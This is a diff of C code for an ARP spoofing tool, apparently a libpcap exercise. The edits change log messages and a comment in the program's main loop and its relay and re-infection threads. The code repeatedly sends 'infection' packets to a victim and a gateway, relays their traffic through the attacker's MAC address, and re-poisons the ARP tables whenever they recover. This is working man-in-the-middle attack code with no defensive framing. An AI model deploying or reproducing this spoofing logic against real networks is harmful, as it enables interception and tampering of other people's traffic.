@@ -171,15 +171,14 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	// detect recover arp table and re-infect
+	// detect recover arp table and re-infect thread
 	if (pthread_create(&Re_Infection, NULL, ReInfection, (void*)&IpMacAddr) != 0) {
 		perror("pthread_create()");
 		return -1;
 	}
 
-	// Send Infection packet (10s)
+	// Send Infection packet (1s)
 	while (1) {
-		printf("hi\n");
 		SendInfectionPacket(handle, &IpMacAddr, TOVICTIM);
 		SendInfectionPacket(handle, &IpMacAddr, TOGATEWAY);
 		sleep(1);
@@ -465,7 +464,7 @@ void* PacketRelayVictim(void* args) {
 		memcpy(packet->ETH_Packet.DstMacAddr, IpMacAddr->GatewayMacAddrHex, MACSIZE);
 		memcpy(packet->ETH_Packet.SrcMacAddr, IpMacAddr->MyMacAddrHex, MACSIZE);
 		
-		printf("Victim Relay : %d\n", pkthdr->len);
+		printf("Victim spoofed packet relayed\n");
 		if (pcap_sendpacket(handle, (const unsigned char*)packet, pkthdr->len) == -1) 
 			printf("pcap_sendpacket() : %s\n",pcap_geterr(handle));
 	}
@@ -500,7 +499,7 @@ void* PacketRelayGateway(void* args) {
 
 		memcpy(packet->ETH_Packet.DstMacAddr, IpMacAddr->VictimMacAddrHex, MACSIZE);
 		memcpy(packet->ETH_Packet.SrcMacAddr, IpMacAddr->MyMacAddrHex, MACSIZE);
-		printf("Gateway Relay : %d\n", pkthdr->len);		
+		printf("Gateway spoofed packet relayed\n");		
 		if (pcap_sendpacket(handle, (const unsigned char*)packet, pkthdr->len) == -1) 
 			printf("pcap_sendpacket() : %s\n",pcap_geterr(handle));
 	}
@@ -532,10 +531,12 @@ void* ReInfection(void* args) {
 			printf("pcap_next_ex() : %s\n", pcap_geterr(handle));
 			return (void*)-1;
 		}
-
+		
 		if (memcmp(packet->ETH_Packet.SrcMacAddr, IpMacAddr->VictimMacAddrHex, MACSIZE) == 0) 
 			SendInfectionPacket(handle, IpMacAddr, TOGATEWAY);
 		else 
 			SendInfectionPacket(handle, IpMacAddr, TOVICTIM);
+
+		printf("detect recover arp table\n");
 	}
 }
